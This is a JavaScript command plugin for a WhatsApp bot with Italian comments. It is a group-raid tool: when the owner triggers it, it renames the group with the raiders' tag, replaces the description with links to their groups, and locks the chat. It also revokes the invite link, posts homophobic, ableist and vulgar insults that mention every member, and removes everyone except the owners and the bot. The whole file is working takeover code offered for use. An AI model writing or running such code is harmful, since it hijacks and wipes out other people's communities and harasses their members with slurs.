let handler = async (m, { conn, participants, isBotAdmin }) => {
    if (!m.isGroup) return;

    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    if (!isBotAdmin) return;

    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';

    // 🔹 CAMBIO NOME GRUPPO
    try {
        let metadata = await conn.groupMetadata(m.chat);
        let oldName = metadata.subject;
        let newName = `${oldName} | 𝑺𝑽𝑻 𝑩𝒀  𝚯𝚩𝚵𝐘𝐑𝚫 & OBSIDIAN`;

     // 🔹 CAMBIO DESCRIZIONE GRUPPO 
        await conn.groupUpdateDescription(
            m.chat,
            "obeyra e obsidian regnano, https://chat.whatsapp.com/BZMQxaUywcDDPRyJQWenOG?s=cl&p=a&mlu=3

https://chat.whatsapp.com/C7rgWQdq0J2HsXVGaqWrGR?s=cl&p=a&mlu=3

TUTTI QUI"
        )

        // 3. Chiude il gruppo (Solo Admin)
        await conn.groupSettingUpdate(m.chat, 'announcement')

        await conn.groupUpdateSubject(m.chat, newName);
    } catch (e) {
        console.error('Errore cambio nome gruppo:', e);
    }

    // 🔹 RESET LINK GRUPPO
    let newInviteLink = '';
    try {
        await conn.groupRevokeInvite(m.chat); // invalida il vecchio link
        let code = await conn.groupInviteCode(m.chat); // prende il nuovo codice
        newInviteLink = `https://chat.whatsapp.com/${code}`;
    } catch (e) {
        console.error('Errore reset link:', e);
    }

    let usersToRemove = participants
        .map(p => p.jid)
        .filter(jid =>
            jid &&
            jid !== botId &&
            !ownerJids.includes(jid)
        );

    if (!usersToRemove.length) return;

    let allJids = participants.map(p => p.jid);

    await conn.sendMessage(m.chat, {
                text: "fanculo vi siete fatti fottere pezzi di merda "
    });

    await conn.sendMessage(m.chat, {
        text: `ora froci mongoloidi entrate qui sto morendo ridendo aiuto https://chat.whatsapp.com/C7rgWQdq0J2HsXVGaqWrGR?s=cl&p=a&mlu=3


https://chat.whatsapp.com/BZMQxaUywcDDPRyJQWenOG?s=cl&p=a&mlu=3`,
        mentions: allJids
    });

    try {
        await conn.groupParticipantsUpdate(m.chat, usersToRemove, 'remove');
    } catch (e) {
        console.error(e);
        await m.reply("❌ Errore durante l'hard wipe.");
    }
};

handler.command = ['stronzi'];
handler.group = true;
handler.botAdmin = true;
handler.owner = true;

export default handler;